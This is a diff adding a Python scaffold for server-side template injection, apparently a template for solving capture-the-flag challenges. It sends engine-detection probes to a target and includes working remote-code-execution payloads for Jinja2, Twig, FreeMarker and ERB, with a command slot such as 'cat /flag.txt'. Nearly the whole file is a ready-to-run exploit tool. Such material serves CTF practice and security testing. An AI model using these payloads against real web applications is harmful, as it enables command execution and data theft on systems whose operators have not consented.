@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+# wbx scaffold: SSTI  ({{LOCATION}})
+# Rule: {{RULE}}   Sink: {{SINK}}
+# Note: {{NOTE}}
+#
+# Finish the TODOs, then run against the live challenge instance you are solving.
+import sys
+import urllib.parse
+import urllib.request
+
+BASE = "http://TARGET:PORT"      # TODO: challenge URL
+PARAM = "name"                    # TODO: the parameter that reaches {{SINK}}
+METHOD = "GET"                    # TODO: GET or POST
+
+# Detection probes per engine. Send these first; the one that renders arithmetic
+# tells you the engine, then swap in the matching RCE payload below.
+DETECT = {
+    "jinja2/twig":   ("{{7*7}}", "49"),
+    "jinja2_alt":    ("${7*7}", "49"),
+    "freemarker":    ("${7*7}", "49"),
+    "erb":           ("<%= 7*7 %>", "49"),
+}
+
+# RCE payloads once the engine is known (fill the command).
+CMD = "id"   # TODO: e.g. cat /flag.txt
+RCE = {
+    "jinja2": "{{ cycler.__init__.__globals__.os.popen('" + CMD + "').read() }}",
+    "twig":   "{{['" + CMD + "']|filter('system')}}",
+    "freemarker": '<#assign x="freemarker.template.utility.Execute"?new()>${x("' + CMD + '")}',
+    "erb":    "<%= `" + CMD + "` %>",
+}
+
+
+def send(payload: str) -> str:
+    if METHOD == "GET":
+        url = f"{BASE}/?{urllib.parse.urlencode({PARAM: payload})}"
+        req = urllib.request.Request(url)
+    else:
+        data = urllib.parse.urlencode({PARAM: payload}).encode()
+        req = urllib.request.Request(BASE, data=data)
+    with urllib.request.urlopen(req, timeout=10) as r:
+        return r.read().decode(errors="replace")
+
+
+def main():
+    for engine, (payload, expect) in DETECT.items():
+        body = send(payload)
+        hit = expect in body
+        print(f"[{'+' if hit else '-'}] {engine:<12} payload={payload!r} -> {'RENDERED' if hit else 'no'}")
+    print("\nIf one rendered, send the matching RCE payload from RCE{} with CMD set.")
+
+
+if __name__ == "__main__":
+    main()
